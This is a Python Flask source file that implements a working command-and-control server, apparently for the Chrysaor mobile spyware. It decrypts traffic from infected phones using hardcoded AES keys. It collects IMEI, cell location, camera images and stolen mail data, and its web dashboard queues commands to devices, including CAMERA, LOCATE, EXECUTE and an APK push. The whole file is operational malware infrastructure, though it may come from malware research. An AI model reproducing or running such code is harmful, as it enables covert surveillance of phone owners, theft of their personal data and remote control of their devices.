#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import hashlib
import re
import json
import threading
import time
import gzip
import os
from datetime import datetime
from flask import Flask, request, Response, render_template_string, jsonify, send_from_directory
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad, pad

# ---------- CONFIG ----------
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 8080
FALLBACK_TOKEN = "myToken123"
# ----------------------------

# Hardcoded keys (match HttpCrypto.java)
IV = bytes([0x22, 0x85, 0x4f, 0xa6, 0x66, 0x79, 0x07, 0xa6,
            0xae, 0x5b, 0x8b, 0x1e, 0x3a, 0x05, 0x9b, 0xbf])
KEY1 = bytes([0x56, 0x40, 0x7e, 0x44, 0xea, 0x02, 0xfd, 0x01,
              0x07, 0x99, 0x78, 0xa4, 0x60, 0x93, 0x38, 0x58,
              0xf3, 0x59, 0xcf, 0x90, 0x87, 0x40, 0xd7, 0x67,
              0xef, 0xae, 0x91, 0x19, 0xcf, 0x11, 0x58, 0x4a])
SALT = bytes([0xb6, 0x27, 0xdb, 0x21, 0x5c, 0x7d, 0x35, 0xe4])

# Command queues
command_queues = {}
command_queue_lock = threading.Lock()
event_log = []
event_log_lock = threading.Lock()
MAX_LOG = 200

# ---------- CRYPTO ----------
def aes_decrypt_header(encrypted, key=KEY1):
    cipher = AES.new(key, AES.MODE_CBC, IV)
    return unpad(cipher.decrypt(encrypted), AES.block_size)

def aes_encrypt_response(data, token):
    md5 = hashlib.md5(SALT + token.encode('utf-8')).digest()
    key = md5 + md5
    cipher = AES.new(key, AES.MODE_CBC, IV)
    padded = pad(data, AES.block_size)
    return cipher.encrypt(padded)

def decrypt_with_session_key(data, session_key):
    cipher = AES.new(session_key, AES.MODE_CBC, IV)
    decrypted = cipher.decrypt(data)
    try:
        return unpad(decrypted, AES.block_size)
    except ValueError:
        return decrypted

def try_gunzip(data):
    if len(data) >= 2 and data[:2] == b'\x1f\x8b':
        try:
            return gzip.decompress(data)
        except:
            return data
    return data

# ---------- MULTIPART PARSER ----------
def parse_multipart(body, boundary_bytes):
    parts = {}
    if not boundary_bytes.startswith(b'--'):
        boundary_bytes = b'--' + boundary_bytes
    chunks = body.split(boundary_bytes)
    for chunk in chunks:
        if not chunk or chunk == b'--\r\n' or chunk == b'--' or chunk == b'\r\n':
            continue
        if chunk.endswith(b'--\r\n'):
            chunk = chunk[:-4]
        elif chunk.endswith(b'--'):
            chunk = chunk[:-2]
        blank = chunk.find(b'\r\n\r\n')
        if blank == -1:
            continue
        headers = chunk[:blank].decode('utf-8', errors='ignore')
        content = chunk[blank+4:]
        if content.endswith(b'\r\n'):
            content = content[:-2]
        match = re.search(r'name="([^"]+)"', headers)
        if match:
            parts[match.group(1)] = content
    return parts

# ---------- LOGGING ----------
def add_event(event_type, token, data, extra=None):
    with event_log_lock:
        entry = {
            "time": datetime.now().isoformat(),
            "type": event_type,
            "token": token,
            "data": data,
            "extra": extra,
            "id": len(event_log)
        }
        event_log.append(entry)
        if len(event_log) > MAX_LOG:
            event_log.pop(0)

# ---------- FLASK APP ----------
app = Flask(__name__)

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Chrysaor C2 Dashboard</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { margin: 0; background: #1e1e2f; color: #eee; display: flex; height: 100vh; }
        .sidebar { width: 260px; background: #2a2a3e; padding: 20px; border-right: 1px solid #444; overflow-y: auto; }
        .sidebar h2 { margin-top: 0; color: #7ec8e3; }
        .sidebar .device { background: #3a3a52; padding: 10px; border-radius: 6px; margin-bottom: 8px; }
        .sidebar .device .token { font-weight: bold; color: #ffd966; }
        .sidebar .device .pending { color: #ff8a8a; font-size: 0.8em; margin-left: 10px; }
        .main { flex: 1; display: flex; flex-direction: column; padding: 20px; overflow: hidden; }
        .command-bar { background: #2a2a3e; padding: 15px; border-radius: 8px; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
        .command-bar input, .command-bar select, .command-bar button { padding: 8px 14px; border-radius: 4px; border: none; background: #3a3a52; color: #eee; }
        .command-bar button { background: #4a7a9c; cursor: pointer; font-weight: bold; }
        .command-bar button:hover { background: #5a8ab0; }
        .command-bar .wap { background: #8a4a7c; }
        .log-area { flex: 1; background: #12121e; border-radius: 8px; overflow-y: auto; padding: 10px; border: 1px solid #333; }
        .log-entry { border-bottom: 1px solid #2a2a3e; padding: 8px 0; }
        .log-entry .time { color: #888; font-size: 0.8em; }
        .log-entry .type { font-weight: bold; display: inline-block; width: 80px; }
        .log-entry .type.telemetry { color: #7ec8e3; }
        .log-entry .type.data { color: #b8d9a0; }
        .log-entry .type.log { color: #e6b8a0; }
        .log-entry .type.command { color: #ffd966; }
        .log-entry .type.image { color: #f0a0d0; }
        .log-entry .token-label { color: #ff8a8a; }
        .log-entry .content { white-space: pre-wrap; font-size: 0.9em; margin-top: 4px; background: #1a1a2e; padding: 6px; border-radius: 4px; max-height: 300px; overflow: auto; }
        .log-entry img { max-width: 100%; max-height: 300px; border-radius: 4px; margin-top: 4px; }
        .no-logs { color: #666; font-style: italic; }
    </style>
</head>
<body>
    <div class="sidebar" id="sidebar">
        <h2>Devices</h2>
        <div id="deviceList">Loading...</div>
    </div>
    <div class="main">
        <div class="command-bar">
            <span>Send Command</span>
            <input id="cmdToken" placeholder="Token" value="myToken123">
            <select id="cmdId">
                <option value="0">0 - KILL</option>
                <option value="1">1 - LOCATE</option>
                <option value="3">3 - SET</option>
                <option value="4" selected>4 - CAMERA</option>
                <option value="5">5 - EXECUTE</option>
                <option value="10">10 - WAP PUSH</option>
            </select>
            <input id="cmdArgs" placeholder="Args (optional)">
            <button onclick="sendCommand()">Send</button>
            <button onclick="sendWapPush()" class="wap">WAP Push</button>
            <span id="cmdResult" style="margin-left:10px;color:#7ec8e3;"></span>
        </div>
        <div class="log-area" id="logArea">
            <div class="no-logs">Waiting for data...</div>
        </div>
    </div>

    <script>
        async function fetchDevices() {
            try {
                const resp = await fetch('/devices');
                const data = await resp.json();
                const container = document.getElementById('deviceList');
                if (data.length === 0) {
                    container.innerHTML = '<div class="device">No devices connected</div>';
                    return;
                }
                let html = '';
                for (const d of data) {
                    html += `<div class="device">
                                <span class="token">${d.token}</span>
                                <span class="pending">📩 ${d.pending}</span>
                            </div>`;
                }
                container.innerHTML = html;
            } catch(e) { console.error(e); }
        }

        async function fetchLogs() {
            try {
                const resp = await fetch('/events');
                const logs = await resp.json();
                const container = document.getElementById('logArea');
                if (logs.length === 0) {
                    container.innerHTML = '<div class="no-logs">Waiting for data...</div>';
                    return;
                }
                let html = '';
                for (const entry of logs) {
                    let contentHtml = '';
                    if (entry.type === 'telemetry') {
                        contentHtml = `<div class="content">${entry.data}</div>`;
                    } else if (entry.type === 'image') {
                        contentHtml = `<img src="/image/${entry.id}" />`;
                    } else {
                        contentHtml = `<div class="content">${entry.data}</div>`;
                    }
                    html += `<div class="log-entry">
                                <span class="time">${entry.time}</span>
                                <span class="type ${entry.type}">[${entry.type}]</span>
                                <span class="token-label">${entry.token}</span>
                                ${contentHtml}
                            </div>`;
                }
                container.innerHTML = html;
                container.scrollTop = container.scrollHeight;
            } catch(e) { console.error(e); }
        }

        async function sendCommand() {
            const token = document.getElementById('cmdToken').value.trim();
            const cmd = document.getElementById('cmdId').value;
            const args = document.getElementById('cmdArgs').value.trim();
            const resultSpan = document.getElementById('cmdResult');
            if (!token) { resultSpan.textContent = 'Token required'; return; }
            try {
                const resp = await fetch('/cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({token: token, cmd: cmd, args: args})
                });
                const text = await resp.text();
                resultSpan.textContent = ' '+text;
            } catch(e) {
                resultSpan.textContent = 'Error';
            }
        }

        async function sendWapPush() {
            const token = document.getElementById('cmdToken').value.trim();
            if (!token) { alert('Token required'); return; }
            const url = window.location.origin + '/samples/demo.apk';
            try {
                const resp = await fetch('/cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({token: token, cmd: '10', args: url})
                });
                const text = await resp.text();
                document.getElementById('cmdResult').textContent = ' ' + text;
            } catch(e) {
                document.getElementById('cmdResult').textContent = 'Error';
            }
        }

        setInterval(fetchDevices, 2000);
        setInterval(fetchLogs, 2000);
        fetchDevices();
        fetchLogs();
        document.getElementById('cmdArgs').addEventListener('keydown', (e) => {
            if (e.key === 'Enter') sendCommand();
        });
    </script>
</body>
</html>
"""

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/devices')
def list_devices():
    with command_queue_lock:
        devices = [{"token": t, "pending": len(c)} for t, c in command_queues.items()]
        return jsonify(devices)

@app.route('/events')
def get_events():
    with event_log_lock:
        return jsonify(event_log[-50:])

@app.route('/image/<int:event_id>')
def get_image(event_id):
    with event_log_lock:
        if event_id < len(event_log) and event_log[event_id]['type'] == 'image':
            b64_data = event_log[event_id]['data']
            fmt = event_log[event_id].get('extra', {}).get('format', 'jpeg')
            try:
                img_data = base64.b64decode(b64_data)
                return Response(img_data, mimetype='image/png' if fmt == 'png' else 'image/jpeg')
            except Exception as e:
                return f"Image decode error: {e}", 500
    return "Image not found", 404

@app.route('/cmd', methods=['POST'])
def queue_command():
    try:
        data = request.get_json()
        if not data: return "Missing JSON body", 400
        token = data.get('token')
        cmd = data.get('cmd')
        args = data.get('args', '')
        if not token or cmd is None: return "Missing token or cmd", 400
        with command_queue_lock:
            if token not in command_queues:
                command_queues[token] = []
            command_queues[token].append({"cmd": str(cmd), "ack": int(time.time()) % 100000, "args": args})
        add_event("command", token, f"Command {cmd} queued", {"args": args})
        return f"Command {cmd} queued for {token}", 200
    except Exception as e:
        return str(e), 500

@app.route('/samples/<path:filename>')
def serve_sample(filename):
    if not os.path.exists('samples'):
        os.makedirs('samples')
    return send_from_directory('samples', filename)

@app.route('/support.aspx', methods=['POST'])
def support():
    session_id1 = request.headers.get('SessionId1')
    session_id2 = request.headers.get('SessionId2')
    content_type = request.headers.get('Content-Type')
    print(f"[+] SessionId1: {session_id1}")
    print(f"[+] SessionId2: {session_id2}")

    try:
        encrypted_session_key = base64.b64decode(session_id2)
        session_key = aes_decrypt_header(encrypted_session_key)
        print(f"[+] Decrypted session key: {session_key.hex()}")
    except Exception as e:
        print(f"[-] Decrypt session key error: {e}")
        return "Error", 400

    raw_body = request.get_data()
    boundary = content_type.split('boundary=')[1]
    boundary_bytes = boundary.encode('utf-8')
    parts = parse_multipart(raw_body, boundary_bytes)
    print(f"[+] Parts found: {list(parts.keys())}")

    token = FALLBACK_TOKEN
    telemetry = {}
    data_parts = []

    for name, encrypted_data in parts.items():
        print(f"[+] Decrypting part: {name} (size={len(encrypted_data)})")
        try:
            decrypted = decrypt_with_session_key(encrypted_data, session_key)
            print(f"[+] Decrypted size: {len(decrypted)} bytes")
            if name == 'header':
                try:
                    decrypted = try_gunzip(decrypted)
                    xml_text = decrypted.decode('utf-8', errors='ignore')
                    token_match = re.search(r'<token id="([^"]+)"', xml_text)
                    if token_match: token = token_match.group(1)
                    plat_match = re.search(r'<platformInfo[^>]+manufacturer="([^"]+)"[^>]+model="([^"]+)"[^>]+nativeId="([^"]+)"[^>]+osVersion="([^"]+)"[^>]+batteryLevel="([^"]+)"', xml_text)
                    if plat_match:
                        telemetry['manufacturer'] = plat_match.group(1)
                        telemetry['model'] = plat_match.group(2)
                        telemetry['imei'] = plat_match.group(3)
                        telemetry['osVersion'] = plat_match.group(4)
                        telemetry['battery'] = plat_match.group(5)
                    cell_match = re.search(r'<cellInfo[^>]+cellId="([^"]+)"[^>]+LAC="([^"]+)"[^>]+MCC="([^"]+)"[^>]+MNC="([^"]+)"', xml_text)
                    if cell_match:
                        telemetry['cellId'] = cell_match.group(1)
                        telemetry['lac'] = cell_match.group(2)
                        telemetry['mcc'] = cell_match.group(3)
                        telemetry['mnc'] = cell_match.group(4)
                    com_match = re.search(r'<com comMethod="([^"]+)"', xml_text)
                    if com_match:
                        telemetry['comMethod'] = com_match.group(1)
                    telemetry['token'] = token
                    telemetry['timestamp'] = datetime.now().isoformat()
                    add_event("telemetry", token, json.dumps(telemetry, indent=2))
                except Exception as e:
                    print(f"[-] Header parse error: {e}")
            elif name == 'log':
                decrypted = try_gunzip(decrypted)
                try:
                    log_text = decrypted.decode('utf-8', errors='ignore')
                    add_event("log", token, log_text[:1000])
                except:
                    pass
            else:
                data_parts.append((name, decrypted))
        except Exception as e:
            print(f"[-] Failed to decrypt part '{name}': {e}")

    # Process dynamic parts
    for name, content in data_parts:
        print(f"[+] Processing dynamic part: {name} (size={len(content)})")
        if len(content) >= 4:
            if content[:4] in (b'\xff\xd8\xff\xe0', b'\xff\xd8\xff\xe1'):
                b64 = base64.b64encode(content).decode('ascii')
                add_event("image", token, b64, {"size": len(content), "format": "jpeg"})
                print(f"[+] Added JPEG image")
                continue
            elif content[:4] == b'\x89PNG':
                b64 = base64.b64encode(content).decode('ascii')
                add_event("image", token, b64, {"size": len(content), "format": "png"})
                print(f"[+] Added PNG image")
                continue

        if name.endswith('.jigglypuff_mail') or (len(content) >= 2 and content[:2] == b'\x1f\x8b'):
            content = try_gunzip(content)
            print(f"[+] Gunzipped to {len(content)} bytes")
        try:
            text_data = content.decode('utf-8', errors='ignore')
            if text_data.strip():
                add_event("data", token, text_data[:2000])
            else:
                add_event("data", token, f"Empty data (size={len(content)})")
        except:
            add_event("data", token, f"Binary data ({len(content)} bytes)")

    # Send response
    with command_queue_lock:
        if token in command_queues and command_queues[token]:
            cmd = command_queues[token].pop(0)
            response_xml = f'''<?xml version="1.0"?>
<response code="0" message="OK">
    <cmd>{cmd.get('cmd', 1)}</cmd>
    <a>{cmd.get('ack', 12345)}</a>
    <arg>{cmd.get('args', '')}</arg>
    <s>dummy_sig</s>
</response>'''
            print(f"[+] Sending command {cmd.get('cmd')} to {token}")
        else:
            response_xml = '''<?xml version="1.0"?>
<response code="0" message="OK"/>'''

    encrypted_response = aes_encrypt_response(response_xml.encode('utf-8'), token)
    print(f"[+] Encrypted response size: {len(encrypted_response)} bytes")
    return Response(encrypted_response, status=200, content_type='application/octet-stream')

if __name__ == '__main__':
    if not os.path.exists('samples'):
        os.makedirs('samples')
        print("[!] Created samples/ folder – place your demo.apk there.")
    print("[+] Starting Chrysaor C2 with Web Dashboard")
    print(f"[+] Dashboard: http://{SERVER_HOST if SERVER_HOST != '0.0.0.0' else '127.0.0.1'}:{SERVER_PORT}/")
    app.run(host=SERVER_HOST, port=SERVER_PORT, debug=False, threaded=True)